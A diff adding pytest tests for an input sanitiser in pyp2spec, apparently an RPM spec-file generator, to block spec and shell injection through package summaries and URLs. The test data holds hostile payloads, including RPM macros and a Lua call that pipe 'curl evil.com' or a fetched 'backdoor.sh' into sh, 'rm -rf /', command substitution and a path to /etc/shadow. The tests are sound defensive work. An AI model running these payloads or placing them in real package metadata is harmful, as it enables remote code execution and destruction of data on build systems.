@@ -4,7 +4,7 @@ from pyp2spec.utils import filter_license_classifiers, prepend_name_with_python
 from pyp2spec.utils import normalize_name, get_extras, contains_wheel_with_abi_tag
 from pyp2spec.utils import normalize_as_wheel_name, archive_name
 from pyp2spec.utils import resolve_url, SdistNotFoundError, MissingPackageNameError
-from pyp2spec.utils import create_compat_name
+from pyp2spec.utils import create_compat_name, sanitize_input
 
 
 def test_license_classifier_read_correctly():
@@ -213,3 +213,77 @@ def test_project_urls_empty():
 )
 def test_create_compat_name(name, compat, expected):
     assert create_compat_name(name, compat) == expected
+
+
+@pytest.mark.parametrize(
+    ("summary", "expected"), [
+        ("A Python package", "A Python package"),
+        ("Line 1\nLine 2", "Line 1 Line 2"),
+        ("Package %(system curl evil.com|sh)", "Package"),
+        ("Version %{version} package", "Version %%{version} package"),
+        ("Good summary\n%prep\n%{system rm -rf /}", "Good summary %%prep %%{system rm -rf /}"),
+        ("Text\x00with\x01control\x1fchars", "Textwithcontrolchars"),
+        ("Python 包管理工具", "Python 包管理工具"),
+    ]
+)
+def test_sanitize_summary(summary, expected):
+    assert sanitize_input(summary) == expected
+
+
+def test_sanitize_spec_injection_via_summary():
+    attack = """Legitimate summary
+%prep
+%{lua: os.execute("curl evil.com/backdoor.sh | sh")}
+"""
+    result = sanitize_input(attack)
+    assert "\n" not in result
+    assert "%%prep" in result
+
+
+@pytest.mark.parametrize(
+    ("value", "desc"), [
+        ("Package $(whoami)", "command substitution"),
+        ("Tool `id`", "backticks"),
+        ("Package | sh", "pipe"),
+        ("Tool; rm -rf /", "semicolon"),
+        ("Package && id", "double ampersand"),
+        ("Tool & background", "ampersand"),
+        ("Text >output.txt", "redirect"),
+        ("Read <input.txt", "input redirect"),
+        ("Exec (subshell)", "parentheses"),
+        ("Array [0]", "square brackets"),
+        ("Path \\escape", "backslash"),
+        ("Quote 'test'", "single quotes"),
+        ('Quote "test"', "double quotes"),
+    ]
+)
+def test_sanitize_removes_shell_metacharacters(value, desc):
+    result = sanitize_input(value)
+    for char in ['$', '`', '|', ';', '&', '<', '>', '(', ')', '[', ']', '\\', "'", '"']:
+        assert char not in result, f"Shell metacharacter {char!r} found in: {result}"
+
+
+@pytest.mark.parametrize(
+    ("url", "expected"), [
+        ("https://example.com/pkg", "https://example.com/pkg"),
+        ("http://evil.com%(system id)", "http://evil.com"),
+        ("http://example.com\nBuildRequires: evil", "http://example.comBuildRequires:evil"),
+        ("http://example .com/path with spaces", "http://example.com/pathwithspaces"),
+        ("https://evil.com/%{buildroot}/etc/shadow", "https://evil.com/%%{buildroot}/etc/shadow"),
+        # URL-specific characters that should be preserved
+        ("https://github.com/issues?a=1&b=2", "https://github.com/issues?a=1&b=2"),
+        ("https://en.wikipedia.org/wiki/Python_(lang)", "https://en.wikipedia.org/wiki/Python_(lang)"),
+        ("https://example.com/path[123]", "https://example.com/path[123]"),
+        ("https://example.com/search?q='test'", "https://example.com/search?q='test'"),
+    ]
+)
+def test_sanitize_url_dangerous_content(url, expected):
+    assert sanitize_input(url, url=True) == expected
+
+
+def test_sanitize_multiple_macro_types():
+    malicious = "Text %(system id) and %{version} and %%{safe}"
+    result = sanitize_input(malicious)
+    assert "%(system" not in result
+    assert "%%{version}" in result
+    assert "%%{safe}" in result
